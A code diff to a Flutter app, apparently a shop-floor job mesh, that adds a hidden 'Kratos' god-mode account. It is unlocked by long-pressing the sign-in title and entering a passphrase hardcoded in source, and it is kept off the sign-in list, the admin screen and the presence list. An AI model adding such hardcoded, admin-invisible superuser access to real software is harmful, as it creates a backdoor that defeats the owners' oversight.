@@ -45,6 +45,11 @@ typedef _SchedDrag = ({PmsCheck? check, Job? job});
 const _kAppId = 'grapheion';
 // Synced collection names + the Peer model live in mesh_store.dart (kJobs, …).
 
+// Kratos (god-mode) gate. Kratos is NOT a pickable role — it's unlocked by this
+// secret (long-press the sign-in title) AND bound to the first device that
+// claims it. CHANGE THIS before building the demo, and keep it to yourself.
+const _kKratosPass = 'kratos-change-me-before-demo';
+
 /// A peer is "online" if we've heard a presence beat from it within this window.
 const _kOnlineWindowMs = 30 * 1000;
 
@@ -270,6 +275,45 @@ class _HomePageState extends State<HomePage> {
     return a;
   }
 
+  /// Unlock god-mode (Kratos): validate the passphrase, then claim Kratos on
+  /// this device (binding it) or sign in if it's already this device's. Returns
+  /// an error string, or null on success (signs in).
+  String? _unlockKratos(String pass) {
+    if (pass != _kKratosPass) return 'Incorrect passphrase.';
+    final me = _store.myNodeId;
+    if (me == null || me.isEmpty) return 'Node not ready — try again.';
+    final existing =
+        _accounts.values.where((a) => a.role == Role.kratos).toList();
+    if (existing.isNotEmpty) {
+      final k = existing.first;
+      if (k.boundNodeId == me) {
+        _setAccount(k);
+        return null;
+      }
+      return 'Kratos is bound to another device.';
+    }
+    // Claim Kratos on this device.
+    final salt = _randHex(16);
+    final a = Account(
+      id: 'acct-kratos-${_randHex(8)}',
+      name: 'Kratos',
+      rate: '',
+      role: Role.kratos,
+      workcenterId:
+          _org.workcenters.isNotEmpty ? _org.workcenters.keys.first : '',
+      pinSalt: salt,
+      pinHash: hashPin(salt, _randHex(8)), // unused — access is passphrase+device
+      boundNodeId: me,
+      createdAtMs: DateTime.now().millisecondsSinceEpoch,
+    );
+    _accounts[a.id] = a;
+    final json = jsonEncode(a.toJson());
+    _node!.putRaw(kAccounts, a.id, json);
+    _bleBroadcast(kAccounts, a.id, json);
+    _setAccount(a);
+    return null;
+  }
+
   /// Admin action: persist an edited account (e.g. adjusting a self-registered
   /// person's role / work center).
   void _updateAccount(Account a) {
@@ -433,6 +477,7 @@ class _HomePageState extends State<HomePage> {
   void _publishPresence() {
     final node = _node;
     if (node == null || _role == null) return; // no beat until signed in
+    if (_isKratos) return; // god mode stays off the presence list
     final json = jsonEncode({
       'nodeId': node.nodeId,
       'name': _name,
@@ -1323,12 +1368,15 @@ class _HomePageState extends State<HomePage> {
     // 2. Account sign-in (pick your profile + PIN, or bootstrap the first admin).
     if (_account == null) {
       return _SignInScreen(
-        accounts: _accounts.values.toList()
+        accounts: _accounts.values
+            .where((a) => a.role != Role.kratos) // Kratos stays hidden
+            .toList()
           ..sort((a, b) => a.name.compareTo(b.name)),
         org: _org,
         isHost: _isMeshHost,
         onSignIn: _setAccount,
         onCreate: _createAccount,
+        onUnlockKratos: _unlockKratos,
         onReset: () => _confirmReset(context),
       );
     }
@@ -1375,7 +1423,9 @@ class _HomePageState extends State<HomePage> {
           IconButton(
             onPressed: () => Navigator.of(context).push(MaterialPageRoute(
               builder: (_) => _AdminScreen(
-                accounts: _accounts.values.toList()
+                accounts: _accounts.values
+                    .where((a) => a.role != Role.kratos) // Kratos stays hidden
+                    .toList()
                   ..sort((a, b) => a.name.compareTo(b.name)),
                 org: _org,
                 onCreate: _createAccount,
@@ -3319,12 +3369,14 @@ class _SignInScreen extends StatelessWidget {
     required this.isHost,
     required this.onSignIn,
     required this.onCreate,
+    required this.onUnlockKratos,
     required this.onReset,
   });
   final List<Account> accounts;
   final OrgChart org;
   final bool isHost;
   final void Function(Account) onSignIn;
+  final String? Function(String passphrase) onUnlockKratos;
   final VoidCallback onReset;
   final Account Function({
     required String name,
@@ -3340,7 +3392,7 @@ class _SignInScreen extends StatelessWidget {
     if (isHost && accounts.isEmpty) {
       return Scaffold(
         appBar: AppBar(
-            title: const Text('Set up admin'),
+            title: _kratosTitle(context, 'Set up admin'),
             actions: [_resetButton(), themeToggleButton(context)]),
         body: SingleChildScrollView(
           padding: const EdgeInsets.all(24),
@@ -3379,7 +3431,7 @@ class _SignInScreen extends StatelessWidget {
     // Hybrid: pick an admin-created account (+ PIN), or self-register.
     return Scaffold(
       appBar: AppBar(
-          title: const Text('Sign in'),
+          title: _kratosTitle(context, 'Sign in'),
           actions: [_resetButton(), themeToggleButton(context)]),
       body: ListView(
         children: [
@@ -3420,6 +3472,47 @@ class _SignInScreen extends StatelessWidget {
         tooltip: 'Reset / leave mesh',
       );
 
+  /// The title — long-press reveals the hidden Kratos unlock (god mode).
+  Widget _kratosTitle(BuildContext context, String text) => GestureDetector(
+        onLongPress: () => _promptKratos(context),
+        child: Text(text),
+      );
+
+  void _promptKratos(BuildContext context) {
+    final ctrl = TextEditingController();
+    String? error;
+    showDialog(
+      context: context,
+      builder: (ctx) => StatefulBuilder(builder: (ctx, setS) {
+        void attempt() {
+          final err = onUnlockKratos(ctrl.text);
+          if (err == null) {
+            Navigator.pop(ctx); // success — parent rebuilds out of sign-in
+          } else {
+            setS(() => error = err);
+          }
+        }
+
+        return AlertDialog(
+          title: const Text('Unlock'),
+          content: TextField(
+            controller: ctrl,
+            obscureText: true,
+            autofocus: true,
+            decoration: InputDecoration(labelText: 'Passphrase', errorText: error),
+            onSubmitted: (_) => attempt(),
+          ),
+          actions: [
+            TextButton(
+                onPressed: () => Navigator.pop(ctx),
+                child: const Text('Cancel')),
+            FilledButton(onPressed: attempt, child: const Text('Unlock')),
+          ],
+        );
+      }),
+    );
+  }
+
   void _selfRegister(BuildContext context) {
     Navigator.of(context).push(MaterialPageRoute(
       builder: (ctx) => Scaffold(
@@ -3431,7 +3524,7 @@ class _SignInScreen extends StatelessWidget {
               constraints: const BoxConstraints(maxWidth: 420),
               child: _AccountForm(
                 org: org,
-                roles: isHost ? Role.values : Role.values.where((r) => r != Role.kratos).toList(),
+                roles: Role.values.where((r) => r != Role.kratos).toList(),
                 submitLabel: 'Register & sign in',
                 onSubmit: (name, rate, role, wc, pin) {
                   final a = onCreate(
